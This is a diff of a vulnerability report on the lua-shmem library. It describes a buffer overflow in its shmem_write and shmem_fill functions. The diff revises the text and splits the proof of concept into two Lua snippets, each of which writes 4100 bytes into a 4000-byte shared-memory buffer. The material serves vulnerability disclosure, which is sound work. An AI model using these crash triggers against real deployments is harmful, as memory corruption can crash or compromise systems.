@@ -14,7 +14,7 @@ Lua-shmem is a Low-level Lua convenience wrapper for IPC shared memory functiona
 
 ### Vulnerability Description
 
-buffer overflow in alien https://github.com/EngiN33R/lua-shmem/blob/master/src/shmem.c
+buffer overflow in https://github.com/EngiN33R/lua-shmem/blob/master/src/shmem.c
 
 vuln function: `shmem_write`，`shmem_fill`
 
@@ -32,11 +32,20 @@ The following content is a typical case:
 local shmem = require("shmem")
 local mem = shmem.new(4000)
 print("test")
-mem:write(string.rep("A", 4100))
---mem:fill(string.rep("A", 4100))
+mem:fill(string.rep("A", 4100))
 print("test")
 ```
 
 ![2](img/2.png)
+
+
+
+```
+local shmem = require("shmem")
+local mem = shmem.new(4000)
+print("test")
+mem:write(string.rep("A", 4100))
+print("test")
+```
 
 ![3](img/3.png)
